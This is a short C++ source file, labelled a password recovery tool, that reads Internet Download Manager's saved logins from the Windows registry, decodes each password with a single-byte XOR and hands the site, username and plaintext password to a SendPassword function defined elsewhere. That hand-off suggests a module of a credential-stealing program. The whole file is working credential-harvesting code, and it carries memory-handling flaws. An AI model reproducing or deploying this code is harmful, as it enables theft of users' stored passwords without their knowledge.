// IDM Password Recovery
// Programmed by: Piejustice
// Date: 6th May 2010
// Credits: http://aluigi.freeforums.org/post7459.html#p7459

#include "Windows.h"
#include "stdio.h"
#include "Config.h"

#define KEYDIR "Software\\DownloadManager\\Passwords"

int GetIDMAccounts()
{
	HKEY hKey = 0;

	if (RegOpenKeyExA(HKEY_CURRENT_USER, KEYDIR, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
		DWORD dwSubKeys, dwMaxSubKeyLen;

		RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwSubKeys, &dwMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL);
		char *szSubKeyName = new char [dwMaxSubKeyLen];
		for (DWORD i = 0; i < dwSubKeys; i++)
        {
			
			DWORD dwSubKeyLen = dwMaxSubKeyLen + 1;
			RegEnumKeyExA(hKey, i, &szSubKeyName[0], &dwSubKeyLen, NULL, NULL, NULL, NULL);
			
			char *szSubKeyDir = (char *) malloc (strlen(KEYDIR) + strlen(&szSubKeyName[0]) + 1);
			sprintf(szSubKeyDir, "%s%s%s", KEYDIR, "\\", &szSubKeyName[0]);

			HKEY hSubKey = 0;
			RegOpenKeyExA(HKEY_CURRENT_USER, &szSubKeyDir[0], 0, KEY_READ, &hSubKey);

			DWORD dwMaxValueLen;
			RegQueryInfoKeyA(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &dwMaxValueLen, NULL, NULL);
			
			char *szUsername = (char *) malloc (dwMaxValueLen);
			char *szPassword = (char *) malloc (dwMaxValueLen);

			DWORD dwValueLen = dwMaxValueLen;
			RegQueryValueExA(hSubKey, "User", NULL, NULL, (BYTE *)&szUsername[0], &dwValueLen);
			dwValueLen = dwMaxValueLen;
			RegQueryValueExA(hSubKey, "EncPassword", NULL, NULL, (BYTE *)&szPassword[0], &dwValueLen);

			for (DWORD j = 0; j < strlen(szPassword); j++) {
				szPassword[j] ^= '\x0f';
			}
			
            SendPassword(Password_IDM, szSubKeyName, szUsername, szPassword);

			RegCloseKey(hSubKey);
				
			free(&szUsername[0]);
			free(&szPassword[0]);
			free(&szSubKeyDir[0]);
			ZeroMemory(&szSubKeyName[0], dwMaxSubKeyLen);
		}
		delete szSubKeyName;
		
		RegCloseKey (hKey);
	}

	return 1;
}
